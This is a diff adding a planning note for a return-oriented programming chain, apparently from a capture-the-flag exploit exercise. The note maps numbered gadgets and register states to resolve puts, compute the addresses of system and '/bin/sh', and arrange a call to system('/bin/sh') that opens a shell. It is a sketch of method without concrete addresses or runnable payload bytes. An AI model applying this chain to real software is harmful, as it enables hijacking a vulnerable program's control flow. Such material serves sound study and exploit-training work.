@@ -1,0 +1,36 @@
+Initial-State
+esp = &gadgets
+r8 = &system - &puts
+r9 = &(&puts)
+r10 = &"/bin/sh" - &puts
+
+Target:
+rdi = &"/bin/sh"
+*esp = &system
+
+Checkpoints:
+Resolve &(&puts) to &puts
+ => Assume (r9 = &(&puts))
+ 	- (Copy r8 - 10 to rax - rcx) + (rcx = *rbx)
+	- (gadget_3) + (gadget_2)
+	- (rax = rsi = rbx = 0) + (rbx += r9) + (rcx = *rbx)
+	- (gadget_6 + gadget_10) + (gadget_1) + (gadget_2)
+
+Get &"/bin/sh" into RDI
+ => Assume (r10 = &"/bin/sh" - &puts) and (rcx = &puts)
+ 	- (rax = rsi = 0) + (rsi = rsi#rcx, rdi=rdi#rcx) +  (rcx = rsi + r10) + (rcx=rcx#rdi) + (rsi = rsi#rcx, rdi=rdi#rcx)
+	- (gadget_6) + (gadget_13) + (gadget_12) + (gadget_4) + (gadget_13)
+
+Get &system onto Stack
+ => Assume (r8  = &system - &puts) and (rcx = &puts)
+ 	- (rax = rsi = 0) + (rcx=rcx#rdi) + (rsi = rsi#rcx, rdi=rdi#rcx) + (rdi += r8)
+ 	- (gadget_6) + (gadget_4) + (gadget_13) + (gadget_8)
+ 	
+Plan:
+(gadget_3) + (gadget_2) => Set rcx=&puts, pollutes rax;rbx
+(gadget_6) + (gadget_4) + (gadget_13) + (gadget_8) => Assume rcx=&puts, set rdi=&system, pollutes rsi;rcx
+(gadget_3) + (gadget_2) => Set rcx=&puts, pollutes rax;rbx
+(gadget_6) => Set rsi = 0, pollutes rax
+(gadget_14 + gadget_0) => Set rax=rdi => rax=&system
+(gadget_13) + (gadget_12) + (gadget_4) + (gadget_13) => Assume rsi=0;rcx=&puts, set rdi=&"/bin/sh", pollutes rsi;rcx
+(gadget_5) => Push rax=&system onto stack to execute with rdi=&"/bin/sh"
